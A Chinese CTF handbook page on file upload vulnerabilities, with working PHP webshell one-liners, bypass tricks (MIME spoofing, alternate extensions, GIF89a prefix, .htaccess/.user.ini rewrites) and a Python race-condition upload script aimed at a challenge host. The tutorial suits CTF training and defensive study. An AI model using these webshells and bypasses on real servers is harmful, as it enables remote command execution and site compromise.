---
title: 文件上传
order: 3
icon: material-symbols:upload-file
category:
  - CTF
  - 手册
  - Web
---

文件上传漏洞就是：网站让你传文件，结果你传了个能执行命令的脚本上去。

## 原理

正常的上传流程应该检查文件类型、大小和内容。但只要有一个检查没做好，你就能传一个 WebShell 上去。

WebShell 是一段能在服务器上执行系统命令的代码。PHP 版本只需一行：

```php
<?php @eval($_POST['cmd']); ?>
```

传上去之后，用蚁剑连接，就能在服务器上执行任意命令了。

## 常见绕过方法

### 1. 前端 JS 检查（最简单）

网站只在浏览器端用 JS 检查文件后缀，后端不查。

**绕过**：用 Burp Suite 抓包，把请求里的 `.jpg` 改成 `.php`，重放。

### 2. MIME 类型检查

后端只检查了 `Content-Type: image/jpeg`，没查文件实际内容。

**绕过**：Burp 抓包，把 `Content-Type` 改成 `image/jpeg`，文件内容保持 WebShell 不变。

### 3. 黑名单过滤（最常见）

网站禁止了 `.php`，但总有漏网之鱼：

```
.php3  .php4  .php5  .phtml  .pht  .phar  .shtml
```

不同服务器配置不同，需要挨个试。Apache 下 `.phtml` 和 `.php5` 经常被遗漏。

大小写绕过（Windows 服务器）：`.Php`、`.PHP`、`.pHp`

### 4. 文件内容检查（魔术数字）

后端检查了文件开头的魔术数字，确保是"真的"图片。

**绕过**：在 WebShell 前面加上图片文件头：

```php
GIF89a
<?php @eval($_POST['cmd']); ?>
```

`GIF89a` 是 GIF 文件的魔术数字，后端以为这是张 GIF 图就放行了。

### 5. .htaccess / .user.ini

先传一个配置文件，改变服务器的文件解析行为：

**.htaccess**（Apache）：
```apache
AddType application/x-httpd-php .jpg
```
上传后，服务器会把 `.jpg` 文件也当 PHP 执行。

**.user.ini**（Nginx/FastCGI）：
```ini
auto_prepend_file=shell.jpg
```
上传后，所有 PHP 页面执行前都会先包含 `shell.jpg`。

### 6. 条件竞争

后端先存文件再检查，检查不通过就删除。利用上传后、被删除前的极短窗口期，用脚本疯狂请求这个文件。

```python
import requests
import threading

url_upload = "http://challenge/upload.php"
url_shell = "http://challenge/uploads/shell.php"

def upload():
    while True:
        requests.post(url_upload, files={"file": ("shell.php", b"<?php system($_GET['cmd']); ?>")})

def access():
    while True:
        r = requests.get(url_shell + "?cmd=id")
        if "uid=" in r.text:
            print("成功！", r.text)
            break

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

## 练手推荐

- [Upload-labs](https://github.com/c0ny1/upload-labs) — 21 关文件上传靶场
- CTFHub 文件上传关
